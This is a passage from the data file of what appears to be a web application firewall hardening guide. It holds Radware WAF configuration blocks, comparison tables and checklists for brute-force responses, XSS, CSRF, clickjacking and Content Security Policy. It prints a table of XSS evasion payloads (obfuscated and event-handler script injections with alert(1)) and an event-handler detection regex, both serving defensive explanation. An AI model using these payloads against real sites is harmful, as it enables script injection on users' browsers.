                    <div><span class="code-param">js-challenge-page</span> <span class="code-value">"/custom/js-challenge.html"</span></div>
                    <div><span class="code-param">captcha-page</span> <span class="code-value">"/custom/captcha.html"</span></div>
                    <div><span class="code-param">challenge-success-cookie</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">cookie-validity</span> <span class="code-value">3600</span></div>
                    <div class="code-comment"># Configure custom response pages</div>
                    <div><span class="code-command">custom-pages</span></div>
                    <div><span class="code-param">brute-force-block-page</span> <span class="code-value">"/custom/brute-force-blocked.html"</span></div>
                    <div><span class="code-param">traversal-block-page</span> <span class="code-value">"/custom/path-traversal-blocked.html"</span></div>
                    <div><span class="code-param">directory-listing-block-page</span> <span class="code-value">"/custom/directory-blocked.html"</span></div>
                    <div><span class="code-param">custom-variables</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">include-block-id</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">include-support-id</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure notification mechanisms</div>
                    <div><span class="code-command">notifications</span></div>
                    <div><span class="code-param">admin-email-alerts</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">email-recipients</span> <span class="code-value">"security@example.com,admin@example.com"</span></div>
                    <div><span class="code-param">syslog-notifications</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">snmp-traps</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">security-dashboard-alerts</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure reporting</div>
                    <div><span class="code-command">reporting</span></div>
                    <div><span class="code-param">detailed-attack-logging</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">attack-summaries</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">trend-analysis</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">geo-mapping</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">source-tracking</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Response Mechanism Comparison</h5>
                <p class="mb-4 text-gray-700">Comparing the different response mechanisms for security violations:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Response Type</th>
                            <th class="p-3 border bg-gray-100">Use Cases</th>
                            <th class="p-3 border bg-gray-100">Advantages</th>
                            <th class="p-3 border bg-gray-100">Disadvantages</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">IP Blocking</td>
                            <td class="p-3 border">Persistent attackers, clear malicious intent</td>
                            <td class="p-3 border">Immediately effective, resource-efficient</td>
                            <td class="p-3 border">Potential for blocking legitimate users (shared IPs)</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">CAPTCHA Challenge</td>
                            <td class="p-3 border">Suspected automation, low-medium risk</td>
                            <td class="p-3 border">Effectively blocks bots, allows humans</td>
                            <td class="p-3 border">User friction, accessibility issues</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">JavaScript Challenge</td>
                            <td class="p-3 border">Basic bot detection, low risk scenarios</td>
                            <td class="p-3 border">Low user friction, blocks simple bots</td>
                            <td class="p-3 border">Advanced bots can bypass, requires JS</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Rate Limiting</td>
                            <td class="p-3 border">High-volume requests, resource protection</td>
                            <td class="p-3 border">Balances access and protection</td>
                            <td class="p-3 border">Sophisticated attacks can work within limits</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Progressive Delay</td>
                            <td class="p-3 border">Slowing down brute force attempts</td>
                            <td class="p-3 border">Reduces attack effectiveness without blocking</td>
                            <td class="p-3 border">Server resource usage, doesn't stop determined attackers</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Account Lockout</td>
                            <td class="p-3 border">Credential-focused attacks</td>
                            <td class="p-3 border">Highly effective for target account</td>
                            <td class="p-3 border">Can be abused for denial of service</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Progressive Response Implementation</h5>
                <p class="mb-4 text-gray-700">Implementing escalating security responses based on threat level:</p>
                <ol class="list-decimal pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Level 1: Silent Monitoring</strong> - Track behavior but take no visible action</li>
                    <li class="mb-2"><strong>Level 2: Response Delay</strong> - Introduce incremental delays for suspicious requests</li>
                    <li class="mb-2"><strong>Level 3: Invisible Challenge</strong> - JavaScript-based verification without user interaction</li>
                    <li class="mb-2"><strong>Level 4: Visible Challenge</strong> - CAPTCHA or similar interactive challenge</li>
                    <li class="mb-2"><strong>Level 5: Temporary Block</strong> - Short-term blocking with clear messaging</li>
                    <li class="mb-2"><strong>Level 6: Extended Block</strong> - Longer blocking period for repeat offenders</li>
                    <li class="mb-2"><strong>Level 7: Permanent Block</strong> - Long-term blocking for persistent attackers</li>
                </ol>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Custom Response Page Best Practices</h5>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Clear Messaging:</strong> Explain the block reason without revealing security details</li>
                    <li class="mb-2"><strong>Resolution Path:</strong> Provide clear instructions for legitimate users</li>
                    <li class="mb-2"><strong>Branding Consistency:</strong> Maintain site branding for user trust</li>
                    <li class="mb-2"><strong>Support Information:</strong> Include contact information for assistance</li>
                    <li class="mb-2"><strong>Reference ID:</strong> Provide a unique identifier for support reference</li>
                    <li class="mb-2"><strong>Custom Variables:</strong> Use dynamic content for context-specific messaging</li>
                    <li class="mb-2"><strong>Language Support:</strong> Implement multi-language support for global users</li>
                    <li class="mb-2"><strong>Mobile Optimization:</strong> Ensure responsive design for all devices</li>
                    <li class="mb-2"><strong>Minimal Information:</strong> Avoid revealing unnecessary system details</li>
                    <li class="mb-2"><strong>Security Headers:</strong> Implement proper security headers on block pages</li>
                </ul>
            `
        }
    ],
    tools: [
        {
            title: 'Brute Force Analyzer',
            icon: 'fa-chart-bar',
            description: 'Advanced analytics tool for detecting and analyzing brute force attack patterns.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'Brute Force Analytics'
        },
        {
            title: 'Directory Protection Scanner',
            icon: 'fa-folder-open',
            description: 'Tool for identifying directory traversal vulnerabilities and protection gaps.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'Directory Security'
        },
        {
            title: 'Authentication Endpoint Mapper',
            icon: 'fa-sign-in-alt',
            description: 'Automated discovery and protection mapping for authentication endpoints.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'Auth Mapping'
        },
        {
            title: 'Traversal Attack Simulator',
            icon: 'fa-route',
            description: 'Testing tool for simulating directory traversal attacks and validating protections.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'Attack Simulation'
        },
        {
            title: 'Credential Stuffing Detector',
            icon: 'fa-key',
            description: 'Advanced tool for detecting credential stuffing attacks using pattern recognition.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'Credential Protection'
        },
        {
            title: 'Progressive Response Manager',
            icon: 'fa-shield-alt',
            description: 'Configurable system for implementing progressive security responses to attacks.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'Response Management'
        },
        {
            title: 'Behavioral Analysis Engine',
            icon: 'fa-brain',
            description: 'Machine learning-based tool for identifying anomalous authentication behavior.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'Behavioral Analysis'
        },
        {
            title: 'Attack Attribution System',
            icon: 'fa-fingerprint',
            description: 'Tool for correlating and attributing distributed brute force attacks.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'Attribution Tools'
        }
    ]
},

{
    id: 'client-side-security',
    title: '19. Client-Side Security',
    subtitle: 'Comprehensive protection against XSS, CSRF, clickjacking, and other client-side attacks with Radware WAF',
    icon: 'fa-browser',
    priority: 'critical',
    progress: 0,
    checklist: [
        {
            title: '19.1 Cross-Site Scripting Protection',
            icon: 'fa-code',
            items: [
                { id: '19.1.1', text: 'Configure reflected XSS protection filters', priority: 'critical' },
                { id: '19.1.2', text: 'Implement stored XSS detection and prevention', priority: 'critical' },
                { id: '19.1.3', text: 'Set up DOM-based XSS protection mechanisms', priority: 'high' },
                { id: '19.1.4', text: 'Configure HTML context-aware XSS filtering', priority: 'high' },
                { id: '19.1.5', text: 'Implement JavaScript context-aware XSS filtering', priority: 'high' },
                { id: '19.1.6', text: 'Set up attribute-based XSS protection', priority: 'high' },
                { id: '19.1.7', text: 'Configure URL-based XSS protection', priority: 'high' },
                { id: '19.1.8', text: 'Implement HTML5-specific XSS protections', priority: 'high' },
                { id: '19.1.9', text: 'Set up JSON/API XSS protection', priority: 'high' },
                { id: '19.1.10', text: 'Configure advanced evasion detection for XSS', priority: 'medium' },
                { id: '19.1.11', text: 'Implement event handler XSS protection', priority: 'high' },
                { id: '19.1.12', text: 'Set up sanitization rules for user-generated content', priority: 'critical' }
            ]
        },
        {
            title: '19.2 Cross-Site Request Forgery Protection',
            icon: 'fa-random',
            items: [
                { id: '19.2.1', text: 'Configure anti-CSRF token validation', priority: 'critical' },
                { id: '19.2.2', text: 'Implement SameSite cookie enforcement', priority: 'high' },
                { id: '19.2.3', text: 'Set up request origin validation', priority: 'high' },
                { id: '19.2.4', text: 'Configure custom header verification', priority: 'medium' },
                { id: '19.2.5', text: 'Implement referrer policy enforcement', priority: 'medium' },
                { id: '19.2.6', text: 'Set up sensitive action protection', priority: 'critical' },
                { id: '19.2.7', text: 'Configure CSRF protection for AJAX requests', priority: 'high' },
                { id: '19.2.8', text: 'Implement cross-domain CSRF protection', priority: 'high' },
                { id: '19.2.9', text: 'Set up detection for CSRF in multi-step processes', priority: 'medium' },
                { id: '19.2.10', text: 'Configure CSRF analytics and reporting', priority: 'medium' }
            ]
        },
        {
            title: '19.3 Clickjacking & UI Redressing Protection',
            icon: 'fa-window-restore',
            items: [
                { id: '19.3.1', text: 'Configure X-Frame-Options header enforcement', priority: 'high' },
                { id: '19.3.2', text: 'Implement frame-ancestors CSP directive', priority: 'high' },
                { id: '19.3.3', text: 'Set up frame-busting script injection', priority: 'medium' },
                { id: '19.3.4', text: 'Configure UI redressing detection', priority: 'medium' },
                { id: '19.3.5', text: 'Implement nested frame protection', priority: 'medium' },
                { id: '19.3.6', text: 'Set up drag-and-drop attack prevention', priority: 'medium' },
                { id: '19.3.7', text: 'Configure cursor-spoofing protection', priority: 'low' },
                { id: '19.3.8', text: 'Implement scroll-jacking prevention', priority: 'low' },
                { id: '19.3.9', text: 'Set up clickjacking analytics and reporting', priority: 'medium' },
                { id: '19.3.10', text: 'Configure sensitive page specific protections', priority: 'high' }
            ]
        },
        {
            title: '19.4 Content Security Policy Implementation',
            icon: 'fa-shield-check',
            items: [
                { id: '19.4.1', text: 'Configure default CSP directive management', priority: 'critical' },
                { id: '19.4.2', text: 'Implement script-src policy controls', priority: 'critical' },
                { id: '19.4.3', text: 'Set up style-src policy controls', priority: 'high' },
                { id: '19.4.4', text: 'Configure img-src policy controls', priority: 'high' },
                { id: '19.4.5', text: 'Implement connect-src policy controls', priority: 'high' },
                { id: '19.4.6', text: 'Set up font-src policy controls', priority: 'medium' },
                { id: '19.4.7', text: 'Configure media-src policy controls', priority: 'medium' },
                { id: '19.4.8', text: 'Implement object-src policy controls', priority: 'high' },
                { id: '19.4.9', text: 'Set up frame-src and child-src policies', priority: 'high' },
                { id: '19.4.10', text: 'Configure form-action policy controls', priority: 'high' },
                { id: '19.4.11', text: 'Implement report-uri/report-to configuration', priority: 'medium' },
                { id: '19.4.12', text: 'Set up CSP violation monitoring and reporting', priority: 'medium' }
            ]
        },
        {
            title: '19.5 Browser Security Headers',
            icon: 'fa-heading',
            items: [
                { id: '19.5.1', text: 'Configure X-Content-Type-Options header', priority: 'high' },
                { id: '19.5.2', text: 'Implement Strict-Transport-Security (HSTS)', priority: 'critical' },
                { id: '19.5.3', text: 'Set up X-XSS-Protection header', priority: 'medium' },
                { id: '19.5.4', text: 'Configure Referrer-Policy header', priority: 'medium' },
                { id: '19.5.5', text: 'Implement Feature-Policy/Permissions-Policy', priority: 'medium' },
                { id: '19.5.6', text: 'Set up Cache-Control and Pragma headers', priority: 'high' },
                { id: '19.5.7', text: 'Configure Clear-Site-Data header for sensitive operations', priority: 'medium' },
                { id: '19.5.8', text: 'Implement Cross-Origin headers (CORS)', priority: 'high' },
                { id: '19.5.9', text: 'Set up Expect-CT header', priority: 'low' },
                { id: '19.5.10', text: 'Configure header consistency across application', priority: 'high' },
                { id: '19.5.11', text: 'Implement NEL (Network Error Logging)', priority: 'low' },
                { id: '19.5.12', text: 'Set up header-based analytics and reporting', priority: 'medium' }
            ]
        },
        {
            title: '19.6 Client-Side Data Protection',
            icon: 'fa-user-shield',
            items: [
                { id: '19.6.1', text: 'Configure cookie security attributes', priority: 'critical' },
                { id: '19.6.2', text: 'Implement localStorage/sessionStorage protection', priority: 'high' },
                { id: '19.6.3', text: 'Set up protection for sensitive form fields', priority: 'high' },
                { id: '19.6.4', text: 'Configure client-side data minimization', priority: 'medium' },
                { id: '19.6.5', text: 'Implement DOM-based data exposure prevention', priority: 'high' },
                { id: '19.6.6', text: 'Set up JSON data protection', priority: 'high' },
                { id: '19.6.7', text: 'Configure HTML5 data attribute protection', priority: 'medium' },
                { id: '19.6.8', text: 'Implement client-side encryption for sensitive data', priority: 'medium' },
                { id: '19.6.9', text: 'Set up browser cache control for sensitive data', priority: 'high' },
                { id: '19.6.10', text: 'Configure JavaScript variable protection', priority: 'medium' },
                { id: '19.6.11', text: 'Implement web worker isolation', priority: 'low' },
                { id: '19.6.12', text: 'Set up IndexedDB security controls', priority: 'medium' }
            ]
        },
        {
            title: '19.7 Advanced Client-Side Protections',
            icon: 'fa-rocket',
            items: [
                { id: '19.7.1', text: 'Configure defense against DOM clobbering', priority: 'medium' },
                { id: '19.7.2', text: 'Implement client-side template injection protection', priority: 'high' },
                { id: '19.7.3', text: 'Set up JavaScript library integrity validation', priority: 'high' },
                { id: '19.7.4', text: 'Configure protection against Rosetta Flash', priority: 'medium' },
                { id: '19.7.5', text: 'Implement JSON injection prevention', priority: 'high' },
                { id: '19.7.6', text: 'Set up HTML5 postMessage security', priority: 'high' },
                { id: '19.7.7', text: 'Configure iframe sandboxing enforcement', priority: 'medium' },
                { id: '19.7.8', text: 'Implement WebSocket security controls', priority: 'high' },
                { id: '19.7.9', text: 'Set up data exfiltration prevention', priority: 'high' },
                { id: '19.7.10', text: 'Configure defense against CSS-based attacks', priority: 'medium' },
                { id: '19.7.11', text: 'Implement browser fingerprinting protection', priority: 'low' },
                { id: '19.7.12', text: 'Set up client-side JavaScript firewall', priority: 'medium' }
            ]
        }
    ],
    techniques: [
        {
            title: 'Cross-Site Scripting (XSS) Protection Configuration',
            content: `
                <p class="mb-4 text-gray-700">Configure Radware WAF to detect and prevent various types of Cross-Site Scripting (XSS) attacks.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure XSS protection</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">client-side-protection</span></div>
                    <div><span class="code-command">xss-protection</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure detection modes</div>
                    <div><span class="code-command">detection</span></div>
                    <div><span class="code-param">reflected-xss</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">stored-xss</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">dom-based-xss</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">detection-level</span> <span class="code-value">high</span></div>
                    <div><span class="code-param">evasion-detection</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure context-aware protection</div>
                    <div><span class="code-command">context-protection</span></div>
                    <div><span class="code-param">html-context</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">js-context</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">attribute-context</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">url-context</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">json-context</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure standard signature detection</div>
                    <div><span class="code-command">signatures</span></div>
                    <div><span class="code-param">standard-signatures</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">custom-signatures</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">signature</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"Custom-XSS-EventHandler"</span></div>
                    <div><span class="code-param">pattern</span> <span class="code-value">"on\\w+\\s*=.*\\(.*\\)"</span></div>
                    <div><span class="code-param">severity</span> <span class="code-value">high</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Configure sanitization rules</div>
                    <div><span class="code-command">sanitization</span></div>
                    <div><span class="code-param">html-sanitization</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">js-sanitization</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">url-sanitization</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">css-sanitization</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">allowed-html-tags</span> <span class="code-value">"a,p,div,span,b,i,u,ul,ol,li,table,tr,td,th,h1,h2,h3,h4,h5,h6,br,hr"</span></div>
                    <div><span class="code-param">allowed-html-attributes</span> <span class="code-value">"href,src,style,class,id,alt,title"</span></div>
                    <div><span class="code-param">allowed-protocols</span> <span class="code-value">"http,https"</span></div>
                    <div class="code-comment"># Configure advanced protection</div>
                    <div><span class="code-command">advanced</span></div>
                    <div><span class="code-param">dynamic-analysis</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">learning-mode</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">learning-period</span> <span class="code-value">7</span></div>
                    <div><span class="code-param">learning-threshold</span> <span class="code-value">90</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">XSS Attack Types and Detection Methods</h5>
                <p class="mb-4 text-gray-700">Overview of XSS attack types and effective detection strategies:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">XSS Type</th>
                            <th class="p-3 border bg-gray-100">Description</th>
                            <th class="p-3 border bg-gray-100">Detection Approach</th>
                            <th class="p-3 border bg-gray-100">Protection Strategies</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Reflected XSS</td>
                            <td class="p-3 border">Malicious input reflected in server response without proper encoding</td>
                            <td class="p-3 border">Parameter inspection, response analysis, pattern matching</td>
                            <td class="p-3 border">Input validation, output encoding, Content-Security-Policy</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Stored XSS</td>
                            <td class="p-3 border">Malicious input stored on server and delivered to users later</td>
                            <td class="p-3 border">Content inspection, contextual analysis, stored data scanning</td>
                            <td class="p-3 border">Content sanitization, HTML purification, CSP, context-aware encoding</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">DOM-based XSS</td>
                            <td class="p-3 border">Client-side JavaScript processes data unsafely, creating XSS vulnerability</td>
                            <td class="p-3 border">Client-side DOM monitoring, JavaScript inspection, behavior analysis</td>
                            <td class="p-3 border">CSP, secure DOM manipulation, client-side sanitization libraries</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Blind XSS</td>
                            <td class="p-3 border">XSS payloads activate in admin panels or back-end systems</td>
                            <td class="p-3 border">Content inspection, out-of-band detection, honeypot fields</td>
                            <td class="p-3 border">Universal sanitization, CSP, secure administrative interfaces</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">mXSS (Mutation-based)</td>
                            <td class="p-3 border">Seemingly safe HTML that mutates into malicious code when parsed</td>
                            <td class="p-3 border">DOM parsing simulation, mutation analysis, browser behavior modeling</td>
                            <td class="p-3 border">HTML sanitization libraries, DOMPurify, strict CSP</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Universal XSS</td>
                            <td class="p-3 border">Browser vulnerabilities enabling XSS despite site protections</td>
                            <td class="p-3 border">Browser fingerprinting, behavior analysis, vulnerability awareness</td>
                            <td class="p-3 border">Multiple layers of defense, CSP, sandboxing</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">XSS Context-Aware Protection</h5>
                <p class="mb-4 text-gray-700">Different contexts require specific XSS protection approaches:</p>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>HTML Context:</strong> Filter/encode &lt;, &gt;, &amp;, &quot;, &#39; characters to prevent tag injection</li>
                    <li class="mb-2"><strong>HTML Attribute Context:</strong> Encode quotes, avoid complex attributes with JavaScript like onmouseover</li>
                    <li class="mb-2"><strong>JavaScript Context:</strong> Special handling for data inside script blocks, escaping quotes and JavaScript special chars</li>
                    <li class="mb-2"><strong>URL Context:</strong> Strict validation of URL parameters, especially in javascript: protocol handlers</li>
                    <li class="mb-2"><strong>CSS Context:</strong> CSS property and value sanitization to prevent expression() and other dangerous constructs</li>
                    <li class="mb-2"><strong>JSON Context:</strong> Ensure proper JSON escaping and avoid direct DOM injection of JSON data</li>
                    <li class="mb-2"><strong>DOM Event Handlers:</strong> Careful validation of any data used in event handler attributes</li>
                    <li class="mb-2"><strong>SVG Context:</strong> Special handling for SVG content which can include script tags and event handlers</li>
                </ul>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">XSS Evasion Techniques and Countermeasures</h5>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Evasion Technique</th>
                            <th class="p-3 border bg-gray-100">Example</th>
                            <th class="p-3 border bg-gray-100">Countermeasure</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Script Obfuscation</td>
                            <td class="p-3 border">&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt;</td>
                            <td class="p-3 border">Comprehensive parsing and normalization before analysis</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Encoding Tricks</td>
                            <td class="p-3 border">&lt;script&gt;&#x61;&#x6C;&#x65;&#x72;&#x74;(1)&lt;/script&gt;</td>
                            <td class="p-3 border">Multiple decode passes, context-aware analysis</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Case Switching</td>
                            <td class="p-3 border">&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;</td>
                            <td class="p-3 border">Case-insensitive pattern matching</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Attribute Splitting</td>
                            <td class="p-3 border">&lt;img o&#x6E;error=alert(1) src=x&gt;</td>
                            <td class="p-3 border">Attribute normalization, HTML parsing</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Event Handler Abuse</td>
                            <td class="p-3 border">&lt;svg onload=alert(1)&gt;</td>
                            <td class="p-3 border">Comprehensive event handler filtering</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Protocol Abuse</td>
                            <td class="p-3 border">&lt;a href=javascript:alert(1)&gt;Click me&lt;/a&gt;</td>
                            <td class="p-3 border">Protocol whitelisting, URL sanitization</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">CSS Injection</td>
                            <td class="p-3 border">&lt;style&gt;@import 'javascript:alert(1)'&lt;/style&gt;</td>
                            <td class="p-3 border">CSS sanitization, CSP style-src directive</td>
                        </tr>
                    </tbody>
                </table>
            `
        },
        {
            title: 'Cross-Site Request Forgery (CSRF) Protection',
            content: `
                <p class="mb-4 text-gray-700">Configure Radware WAF to implement strong protections against Cross-Site Request Forgery (CSRF) attacks.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure CSRF protection</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">client-side-protection</span></div>
                    <div><span class="code-command">csrf-protection</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure token-based protection</div>
                    <div><span class="code-command">token-protection</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">token-parameter-names</span> <span class="code-value">"csrf_token,_csrf,XSRF-TOKEN,X-CSRF-Token"</span></div>
                    <div><span class="code-param">token-header-names</span> <span class="code-value">"X-CSRF-Token,X-XSRF-TOKEN"</span></div>
                    <div><span class="code-param">token-generation</span> <span class="code-value">auto</span></div>
                    <div><span class="code-param">token-length</span> <span class="code-value">32</span></div>
                    <div><span class="code-param">token-entropy</span> <span class="code-value">high</span></div>
                    <div><span class="code-param">token-lifespan</span> <span class="code-value">3600</span></div>
                    <div class="code-comment"># Configure protected resources</div>
                    <div><span class="code-command">protected-resources</span></div>
                    <div><span class="code-param">enforce-for-methods</span> <span class="code-value">"POST,PUT,DELETE,PATCH"</span></div>
                    <div><span class="code-param">exclude-paths</span> <span class="code-value">"/api/public/*,/static/*"</span></div>
                    <div><span class="code-param">include-paths</span> <span class="code-value">"/admin/*,/profile/*,/settings/*"</span></div>
                    <div><span class="code-param">sensitive-actions</span> <span class="code-value">"/user/password,/payment/*,/account/delete"</span></div>
                    <div><span class="code-param">ajax-protection</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure additional protections</div>
                    <div><span class="code-command">additional-protections</span></div>
                    <div><span class="code-param">enforce-same-origin</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">verify-referer</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">same-site-cookies</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">same-site-value</span> <span class="code-value">Lax</span></div>
                    <div><span class="code-param">custom-header-verification</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">custom-header-name</span> <span class="code-value">X-Requested-With</span></div>
                    <div class="code-comment"># Configure violation response</div>
                    <div><span class="code-command">violations</span></div>
                    <div><span class="code-param">block-on-violation</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">response-code</span> <span class="code-value">403</span></div>
                    <div><span class="code-param">custom-response-page</span> <span class="code-value">"/custom/csrf-violation.html"</span></div>
                    <div><span class="code-param">log-level</span> <span class="code-value">high</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">CSRF Protection Methods Comparison</h5>
                <p class="mb-4 text-gray-700">Comparison of different CSRF protection techniques and their effectiveness:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Protection Method</th>
                            <th class="p-3 border bg-gray-100">How It Works</th>
                            <th class="p-3 border bg-gray-100">Effectiveness</th>
                            <th class="p-3 border bg-gray-100">Implementation Challenges</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Synchronizer Tokens</td>
                            <td class="p-3 border">Server generates random token that must be included in requests</td>
                            <td class="p-3 border">Very High</td>
                            <td class="p-3 border">Token management, token lifecycle, form/AJAX integration</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">SameSite Cookies</td>
                            <td class="p-3 border">Browser prevents cookies from being sent in cross-site requests</td>
                            <td class="p-3 border">High</td>
                            <td class="p-3 border">Browser compatibility, legitimate cross-site scenarios</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Custom Request Headers</td>
                            <td class="p-3 border">Relies on browsers' same-origin policy to prevent custom header setting</td>
                            <td class="p-3 border">Medium-High</td>
                            <td class="p-3 border">Only works for AJAX requests, not for forms</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Double Submit Cookie</td>
                            <td class="p-3 border">Token stored in cookie and as request param, values must match</td>
                            <td class="p-3 border">High</td>
                            <td class="p-3 border">Vulnerable if attacker can set cookies</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Referer Verification</td>
                            <td class="p-3 border">Checks Referer header to ensure request came from your domain</td>
                            <td class="p-3 border">Medium</td>
                            <td class="p-3 border">Referer headers can be disabled, privacy concerns</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Challenge-Response</td>
                            <td class="p-3 border">Requires user interaction to confirm action (CAPTCHA, re-auth)</td>
                            <td class="p-3 border">Very High</td>
                            <td class="p-3 border">Significant user experience impact</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">CSRF Protection Best Practices</h5>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Defense in Depth:</strong> Implement multiple protection mechanisms simultaneously</li>
                    <li class="mb-2"><strong>Token-Based Protection:</strong> Use cryptographically strong random tokens</li>
                    <li class="mb-2"><strong>SameSite Cookies:</strong> Set SameSite=Lax or Strict for all session cookies</li>
                    <li class="mb-2"><strong>Method-Based Protection:</strong> Focus protection on state-changing methods (POST, PUT, DELETE)</li>
                    <li class="mb-2"><strong>Custom Headers:</strong> Require custom headers for AJAX requests (e.g., X-Requested-With)</li>
                    <li class="mb-2"><strong>Referer Validation:</strong> Use as secondary protection, not primary defense</li>
                    <li class="mb-2"><strong>Session Binding:</strong> Bind CSRF tokens to user sessions</li>
                    <li class="mb-2"><strong>Token Rotation:</strong> Regenerate tokens after authentication or privilege changes</li>
                    <li class="mb-2"><strong>Context-Sensitive Protection:</strong> Apply stronger protections for sensitive operations</li>
                    <li class="mb-2"><strong>Log and Monitor:</strong> Track and analyze CSRF violations for attack patterns</li>
                </ul>
            `
        },
        {
            title: 'Content Security Policy Implementation',
            content: `
                <p class="mb-4 text-gray-700">Configure Radware WAF to implement and enforce Content Security Policy (CSP) to prevent various client-side attacks.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure Content Security Policy</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">client-side-protection</span></div>
                    <div><span class="code-command">content-security-policy</span></div>
